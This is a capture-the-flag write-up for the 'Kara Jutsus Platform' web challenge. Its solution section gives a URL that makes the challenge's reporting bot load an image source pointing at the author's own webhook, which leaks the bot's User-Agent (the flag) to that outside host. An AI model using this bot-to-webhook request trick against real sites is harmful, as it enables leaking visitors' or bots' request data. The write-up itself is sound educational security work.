# Web - Kara Jutsus Platform (Unintended Solution)

## Challenge description:

![image](https://user-images.githubusercontent.com/70543460/209965346-78ea05c5-ad92-446a-935f-c74f146ae333.png)

## Quick Navigation:

- **[(1) Testing the web application](https://github.com/Cyb3rDoctor/YogoshaChristmasChallenge2022/blob/main/KaraJutsusPlatform.md#1-testing-the-web-application)**
- **[(2) Getting the flag](https://github.com/Cyb3rDoctor/YogoshaChristmasChallenge2022/blob/main/KaraJutsusPlatform.md#2-getting-the-flag)**

## Solution:

### (1) Testing the web application:

First, I started with testing the functionality of the web application:

The first part of the web application is used to view some Jutsu images:

![image](https://user-images.githubusercontent.com/70543460/209966222-ee42263f-f2ba-4378-a269-e4c2ecc5f51a.png)

![image](https://user-images.githubusercontent.com/70543460/209966849-59bae41c-5d8b-4b4d-9499-64a57e63c638.png)

I also tried viewing an external image and I was able to that:
```
http://54.205.207.242/index.php?src=https://i.kym-cdn.com/entries/icons/original/000/026/489/crying.jpg
```

![image](https://user-images.githubusercontent.com/70543460/209968731-707fc713-81d8-47d0-9e55-9f5ddfc1dfcb.png)


Quick Note:
Here is the meaning of "Jutsu": 😆

![image](https://user-images.githubusercontent.com/70543460/209966654-ec111b30-1827-4736-92bf-c0007e708303.png)

<br/>

The second part of the web application was "Report To Amado" panel, and that's where you can enter a url to report:

![image](https://user-images.githubusercontent.com/70543460/209967024-ca51287e-71c4-4f25-b798-e9725e907e31.png)

![image](https://user-images.githubusercontent.com/70543460/209967190-f90c78d4-522f-407a-b28d-19474b804a57.png)

I entered the URL of a webhook to test the functionality of "Report To Amado" panel:

![image](https://user-images.githubusercontent.com/70543460/209967352-73894ed6-9ef1-4db3-ba5c-f0cb2b63bff5.png)

And I got the following request:

![image](https://user-images.githubusercontent.com/70543460/209967687-a655ac90-c39f-4430-aa8d-115259ee3378.png)

----------

### (2) Getting the flag:

According to the description, the flag is the User-Agent of the bot, but it only appears when I report a link starting with ```http://54.205.207.242```, so I tried reporting the following URL:

```
http://54.205.207.242/index.php?src=https://eoa28qm3szvm2q9.m.pipedream.net
```

Noting that ```https://eoa28qm3szvm2q9.m.pipedream.net``` is my webhook.

![image](https://user-images.githubusercontent.com/70543460/209968034-23dddaf6-44c2-47a7-8e78-1a6202743bee.png)

<br/>

Bingo! I got the flag:

![flag](https://user-images.githubusercontent.com/70543460/209968154-b825033c-ddf8-493c-b421-97d14a10ac30.png)
